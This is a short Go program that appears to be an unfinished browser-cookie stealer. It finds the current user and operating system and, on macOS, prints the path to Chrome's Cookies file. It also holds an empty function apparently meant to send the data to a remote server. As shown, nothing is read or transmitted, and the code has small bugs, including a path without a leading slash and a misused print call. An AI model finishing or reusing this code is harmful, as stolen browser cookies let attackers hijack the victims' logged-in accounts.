package main
import (
    "fmt"
    "runtime"
    "log"
    "os/user"
    "path/filepath"
)

func getCookieMacOS(user string) (filePath string) {
    defaultFilePath := filepath.Join("Users/" + user, "Library/Application Support/Google/Chrome/Default/Cookies")
    return defaultFilePath
}

func send_data_to_css() {
    
}



func main() {
    fmt.Println("Hello")
    os := runtime.GOOS
    currentUser, err := user.Current()
    if err != nil {
        log.Fatalf(err.Error())
    }
    user := currentUser.Username
    switch os {
        case "windows":
            fmt.Println("Windows", user)
        case "darwin":
            fmt.Println("MacOS", user)
            defaultFilePath := getCookieMacOS(user)
            fmt.Println(defaultFilePath)
        case "linux":
            fmt.Println("Linux", user)
        default:
            fmt.Println("%s.\n", os)
    }
}

